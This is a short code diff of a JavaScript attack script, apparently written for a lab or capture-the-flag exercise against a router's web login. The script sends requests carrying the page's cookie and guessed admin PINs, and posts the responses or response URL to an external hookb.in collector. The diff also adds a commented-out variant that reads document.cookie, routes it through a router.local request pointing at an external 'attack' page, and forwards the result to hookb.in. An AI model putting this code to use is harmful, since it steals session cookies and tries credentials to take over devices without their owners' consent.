@@ -12,14 +12,14 @@ http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
 http.onload = function () {
                 const xhr = new XMLHttpRequest();
-                xhr.open('POST', 'https://hookb.in/W1yMQRGygKSYplzz6Rzp', true);
+                xhr.open('POST', 'https://hookb.in/NOrwD1VeOMfe8mNNl6NW', true);
                 xhr.setRequestHeader('Content-type', 'application/json');
-                xhr.send(JSON.stringify(http.response));
+                xhr.send(JSON.stringify(http.responseURL));
 
 };
 
 // http.send();
-http.send(cook+"&username=admin&pin=admin&notRobot=on");
+http.send(cook+"&username=admin&pin=secured&notRobot=on");
 
 
 
@@ -43,4 +43,20 @@ http.send(cook+"&username=admin&pin=admin&notRobot=on");
 //   }
 //    if (breakCheck) break;
 // }
+//should be logged in at this point...
+
+//const xhr = new XMLHttpRequest();
+//const cook = document.cookie;
+//xhr.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook, true);
+// xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
+// xhr.onload = function () {
+//                 const req = new XMLHttpRequest();
+//                 req.open('POST', 'https://hookb.in/W1yMQRGygKSYplzz6Rzp', true);
+//                 req.setRequestHeader('Content-type', 'application/json');
+//                 req.send(JSON.stringify(xhr.response));
+
+// };
+// xhr.send();
+
+
 
